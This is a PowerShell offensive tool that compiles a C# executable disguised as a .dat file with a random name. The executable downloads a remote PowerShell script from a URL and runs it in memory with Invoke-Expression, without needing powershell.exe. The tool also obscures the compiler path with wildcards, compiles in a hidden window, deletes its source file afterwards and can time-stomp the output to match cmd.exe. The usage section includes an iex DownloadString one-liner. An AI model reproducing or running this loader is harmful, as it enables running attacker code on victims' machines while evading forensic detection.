function New-PsDat {
<#

.SYNOPSIS
* Compiles a .NET Executable as a .dat file. 
* Dat file takes a URL to a remote PowerShell script as its first argument.
* PowerShell script will be executed in-memory via the Net.Webclient DownloadString method.
* Uses System.Management.Automation.dll (PowerShell.exe not required)
* Second argument can be a function within the PowerShell script or anything (make something up), if no function is present in the powershell script.
* Requires two arguments to fire.

.PARAMETER none
Compiles a .DAT file

.PARAMETER Ts
Time-stomps the .dat file to match timestamps of cmd.exe on the target system.

.EXAMPLE

Generate the .dat:

PS> . .\New-PsDat.ps1; New-PsDat

OR:

C:\> powershell "iex (New-Object Net.Webclient).DownloadString('https://server/New-PsDat.ps1'); New-PsDat

.dat usage:

C:\> cmd /c eXuNt.dat https://server/script.ps1 valid_ps_function
C:\> cmd /c eXuNt.dat https://server/script.ps1 foo

Author: (@0rbz_)

#>

[CmdletBinding()]
param (
	[Switch]$Ts
)

	$Z = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
	$X = (-join ((65..90) + (97..122) | Get-Random -Count 7 | foreach {[char]$_}))


	$Source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;

namespace $Z
{
    class $Z
    {
        static void Main(string[] args)
        {
            if (args.Length == 0 || args.Length == 1) return;
            using (PowerShell $X = PowerShell.Create().AddScript("Invoke-Expression (New-Object Net.Webclient).DownloadString("+"'"+args[0]+"'"+")"+";"+args[1]))
            {
                Collection<PSObject> Output = $X.Invoke();
            }
        }
    }
}
"@	 
	$TimeSauce = (Get-Item "C:\??*?\*3?\c??.?x?").FullName
	$FWDir = $([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())
	$SmaDll = [PSObject].Assembly.Location
	$CsFile = "$env:temp\$Z.cs"
	$Compiler = "$FWDir" + "c?c.??e"
	$CompilerExists = (Test-Path "$Compiler")
	$CompilerArgs = "/r:$SmaDll /out:$env:temp\$Z.dat $CsFile"
	
	if ($CompilerExists -and $Ts -eq $False) {
		New-Item "$env:temp\$Z.cs" -ItemType File >$null 2>&1
		Add-Content $CsFile $source
		Start-Process -Wi Hidden -Fi $Compiler -Arg $CompilerArgs
		Sleep 4
		Remove-Item "$env:temp\$Z.cs"
		Write "`n [+] Output --> $env:temp\$Z.dat`n"
	}
	elseif ($CompilerExists -and $Ts) {
		New-Item "$env:temp\$Z.cs" -ItemType File >$null 2>&1
		Add-Content $CsFile $Source
		Start-Process -Wi Hidden -Fi $Compiler -Arg $CompilerArgs
		Sleep 4
		Remove-Item "$env:temp\$Z.cs"
		
		[IO.File]::SetCreationTime("$env:temp\$Z.dat", [IO.File]::GetCreationTime($TimeSauce))
		[IO.File]::SetLastAccessTime("$env:temp\$Z.dat", [IO.File]::GetLastAccessTime($TimeSauce))
		[IO.File]::SetLastWriteTIme("$env:temp\$Z.dat", [IO.File]::GetLastWriteTime($TimeSauce))
		Write "`n [+] Output --> $env:temp\$Z.dat`n"
	}
	else {
		Write " [!] Error: Unable to locate $Compiler."
	}		
}
